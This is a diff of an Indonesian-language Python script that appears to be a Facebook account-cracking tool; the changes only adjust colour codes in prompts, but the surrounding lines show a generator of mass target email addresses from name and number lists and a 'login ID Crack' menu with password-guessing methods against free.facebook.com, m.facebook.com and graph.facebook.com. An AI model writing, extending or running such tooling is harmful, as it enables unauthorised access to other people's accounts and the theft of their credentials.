@@ -441,15 +441,15 @@ def mail2():
 	belakang = ['777','999','111','222','333','444','638','656','556','452','281','812','235','898','998','110','739','892','344','87','665','81','sumarna','dermawan','darmawan','dirgantara','wijayanto','wijayanti','01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','34','35','36','38','39','40','41','42','42','43','44','50','45','46','47','48','49','51','231','241','772','829','610','64','628','528','422','241','321','537','771','883','836','929','737','123','288','913','891','88','66','77','66','55','991','728','923','112','372','882','9238','194','883','809','293','251','726','332','231','829','980','8247','3738','2894','118','119','621','535','567','765','776','236','266','115','825','653','712','210','019','738','538','729','753','436','82','83','766','667','554','445','133','1933','1982','2000','200238','7279','2838','638','9293','789','009','402','452','455','566','655',',223','332','331','313','62','63','64','65','66','67','68','gaming','123','321','332','033','721','768','988','998','901','425','719','223','7789','0018','335','827','811','880','092','064','862','6672','82','91','21','23','31','45','54','677','882','98','890','728','112','221','236','221','621','722','112','829','xd','ramdani','ramadani','maulana','aisyah','773','663','724','252','332','173','809','713','739','221','114','116','117','752','82','56','64','001','002','003','004','005','006','009''102','628','791','991','88','667','66','78','173','992','32','007','07','08','09','01','02','03','04','05','06','66','99','723','820','61','231','geulis','032','610','889','883','812','72','77','101','official','gaming','utama','123','1234','12345','123456','cakep','90','96','25']
 	tengah = ['widianti','yuliyanti','yulianto','supomo','sapitri','rancaekek','yuliana','aprianti','aprilianti','andini','hasanah','karimah','halimah','salamin','farida','adinda','kurniasih','sulistiawati','nurkarimah','nurazizah','daniati','geulis','cantik','imut','gemoy','kece','indrawan','rachmatika','sugiarti','sugih','ferdiansyah','nuraropah','sagita','nuralisa','setiawati','ramayanti','soraya','badriah','sutomo','supardi','supriadi','suparman','solehah','kasep']
 	global ok , cc
-	nama = input(f'{P}[{H}?{P}]{H} nama target : ')
+	nama = input(f'{P}[{H}?{P}]{H} nama target :{H} ')
 	if ',' in str(nama):
 		print(f' {P}└─{J} {H} masukan nama, jangan kosong ')
 		time.sleep(3);exit()
-	doma = input(f'{P}[{H}?{P}] {H}domain (ex:@gmail.com) : ')
+	doma = input(f'{P}[{H}?{P}] {H}domain (ex:@gmail.com) :{H} ')
 	if '@' not in str(doma) or '.com' not in str(doma):
-		print(f' {P}└─{J} {M} masukkan domain dengan benar ')
+		print(f' {P}└─{J}{M} masukkan domain dengan benar ')
 		time.sleep(3);exit()
-	jumlah = input(f'{P}[{H}?{P}] {H}total dump (max:10000) : ')
+	jumlah = input(f'{P}[{H}?{P}] {H}total dump (max:10000) :{H} ')
 	for xyz in range(int(jumlah)):
 		AA = nama
 		BB = [f'{str(rc(tengah))}',f'{str(rr(0,31))}',f'{str(rc(belakang))}']
@@ -662,9 +662,9 @@ def massal():
 		exit()
 ###----------[ ATUR SBLUM KREK ]----------###
 def setting():
-	prints(nel(f'               {P2}{H}login ID Crack{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
-	cetak(nel(f"{P2}[{color_text}01{P2}]. Facebook ID {M2}Old\n{P2}[{color_text}02{P2}]. Facebook ID {K2}New\n{P2}[{color_text}03{P2}]. Facebook ID {H2}Random{P2}",title=f"{H2}{len(id)}{P2} ID TELAH DIKUMPULKAN",width=70,padding=(0,7),style=f"{color_panel}")) 
-	hu = input(f'✶ ━━⫸{H} Input : ')
+	prints(nel(f'               {P2}{bold blue}login ID Crack{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
+	cetak(nel(f"{P2}[{color_text}01{P2}]. Facebook ID {M2}Old\n{P2}[{color_text}02{P2}]. Facebook ID {K2}New\n{P2}[{color_text}03{P2}]. Facebook ID {H2}Random{P2}",title=f"{H2}{len(id)}{P2}{H} ID TELAH DIKUMPULKAN",width=70,padding=(0,7),style=f"{color_panel}")) 
+	hu = input(f'✶ ━━⫸{H} Input :{H} ')
 	if hu in ['1','01']:
 		for tua in sorted(id):
 			id2.append(tua) 
@@ -684,7 +684,7 @@ def setting():
 	else:
 		prints(nel(f'         {P2}{M}Input Tidak Diketahui{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
 		exit()
-	prints(nel(f'               {P2}{H}login Method{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
+	prints(nel(f'               {P2}{bold blue}login Method{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
 	prints(nel(f'{P2}[{color_text}01{P2}]. Method free.facebook.com [[green] Validate [white]]\n[{color_text}02{P2}]. Method m.facebook.com [[green] Async [white]]\n[{color_text}03{P2}]. Method graph.facebook.com [[green] B-Api [white]]',width=70,padding=(0,7),style=f"{color_panel}")) 
 	hc = input(f'✶ ━━⫸ {H} Input{N} : ')
 	if hc in ['1','01']:
@@ -697,7 +697,7 @@ def setting():
 		method.append('metod4')
 	else:
 		method.append('metod1')
-	prints(nel(f'              {P2}{H}Manual Password?{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
+	prints(nel(f'              {P2}{bold blue}Manual Password?{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
 	pwplus=input(f'✶ ━━⫸ {H}Tambahkan Password Manual {N}{M}( Y/t ) {N}')
 	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
